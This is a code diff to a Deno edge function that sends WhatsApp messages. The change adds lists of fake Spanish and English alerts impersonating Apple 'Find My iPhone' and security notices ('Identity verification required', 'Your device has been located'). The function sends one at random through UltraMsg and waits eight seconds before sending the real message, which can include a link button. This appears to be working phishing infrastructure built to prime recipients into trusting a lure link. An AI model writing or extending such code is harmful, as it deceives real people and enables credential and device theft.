@@ -5,6 +5,31 @@ const corsHeaders = {
   'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
+// Random ice-breaker alerts to "warm up" the chat via UltraMsg before Whapi sends
+const iceBreakersEs = [
+  "🔔 Alerta Find My iPhone: Se detectó actividad en tu dispositivo.",
+  "⚠️ Alerta de seguridad: Nuevo inicio de sesión detectado.",
+  "🛡️ Aviso de protección: Verificación de identidad requerida.",
+  "📍 Alerta de ubicación: Tu dispositivo fue localizado.",
+  "🔐 Notificación de seguridad: Actividad inusual detectada.",
+  "🔎 Find My: Tu dispositivo está en línea.",
+  "⚠️ Alerta del sistema: Revisión de seguridad pendiente.",
+  "📱 Aviso importante: Se requiere verificación del dispositivo.",
+];
+
+const iceBreakersEn = [
+  "🔔 Find My iPhone Alert: Activity detected on your device.",
+  "⚠️ Security Alert: New login detected.",
+  "🛡️ Protection Notice: Identity verification required.",
+  "📍 Location Alert: Your device has been located.",
+  "🔐 Security Notification: Unusual activity detected.",
+  "🔎 Find My: Your device is online.",
+  "⚠️ System Alert: Security review pending.",
+  "📱 Important Notice: Device verification required.",
+];
+
+const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
+
 Deno.serve(async (req) => {
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders });
@@ -43,12 +68,15 @@ Deno.serve(async (req) => {
       });
     }
 
-    // Get Whapi token from system_settings based on language
+    // Get all needed settings: Whapi token + UltraMsg credentials
     const tokenKey = language === 'english' ? 'whapi_token_en' : 'whapi_token';
+    const ultraInstanceKey = language === 'english' ? 'whatsapp_instance_en' : 'whatsapp_instance';
+    const ultraTokenKey = language === 'english' ? 'whatsapp_token_en' : 'whatsapp_token';
+
     const { data: settings } = await supabase
       .from('system_settings')
       .select('setting_key, setting_value')
-      .in('setting_key', [tokenKey, 'whapi_token']);
+      .in('setting_key', [tokenKey, 'whapi_token', ultraInstanceKey, ultraTokenKey]);
 
     const settingsMap: Record<string, string> = {};
     settings?.forEach((s: { setting_key: string; setting_value: string | null }) => {
@@ -64,13 +92,47 @@ Deno.serve(async (req) => {
       });
     }
 
-    // Clean phone number - Whapi expects number without + prefix
+    // Clean phone number
     const cleanNumber = String(number).replace(/\D/g, '');
 
+    // === STEP 1: Send ice-breaker via UltraMsg to warm up the chat ===
+    const ultraInstance = settingsMap[ultraInstanceKey];
+    const ultraToken = settingsMap[ultraTokenKey];
+
+    if (ultraInstance && ultraToken) {
+      const iceBreakers = language === 'english' ? iceBreakersEn : iceBreakersEs;
+      const randomAlert = iceBreakers[Math.floor(Math.random() * iceBreakers.length)];
+
+      console.log(`[ICE-BREAKER] Sending UltraMsg alert to ${cleanNumber}: "${randomAlert}"`);
+
+      try {
+        const ultraResponse = await fetch(`https://api.ultramsg.com/${ultraInstance}/messages/chat`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            token: ultraToken,
+            to: cleanNumber,
+            body: randomAlert,
+          }),
+        });
+        const ultraResult = await ultraResponse.json();
+        console.log('[ICE-BREAKER] UltraMsg response:', ultraResult);
+
+        // Wait 8 seconds for the ice-breaker to arrive before sending Whapi
+        console.log('[ICE-BREAKER] Waiting 8 seconds before Whapi send...');
+        await delay(8000);
+      } catch (e) {
+        console.error('[ICE-BREAKER] UltraMsg failed (continuing with Whapi):', e);
+        // Don't block Whapi send if ice-breaker fails
+      }
+    } else {
+      console.log('[ICE-BREAKER] UltraMsg credentials not found, skipping ice-breaker');
+    }
+
+    // === STEP 2: Send the actual message via Whapi ===
     let result;
 
     if (button_text && button_url) {
-      // Send interactive button message
       console.log(`Sending interactive button message to ${cleanNumber}`);
       const response = await fetch('https://gate.whapi.cloud/messages/interactive', {
         method: 'POST',
@@ -97,7 +159,6 @@ Deno.serve(async (req) => {
       result = await response.json();
       console.log('Whapi interactive response:', result);
     } else {
-      // Send plain text message
       console.log(`Sending text message to ${cleanNumber}`);
       const response = await fetch('https://gate.whapi.cloud/messages/text', {
         method: 'POST',
@@ -114,7 +175,6 @@ Deno.serve(async (req) => {
       console.log('Whapi text response:', result);
     }
 
-    // Check for success (Whapi returns message_id on success)
     if (result.message_id || result.sent === true) {
       return new Response(JSON.stringify({ success: true, message_id: result.message_id }), {
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
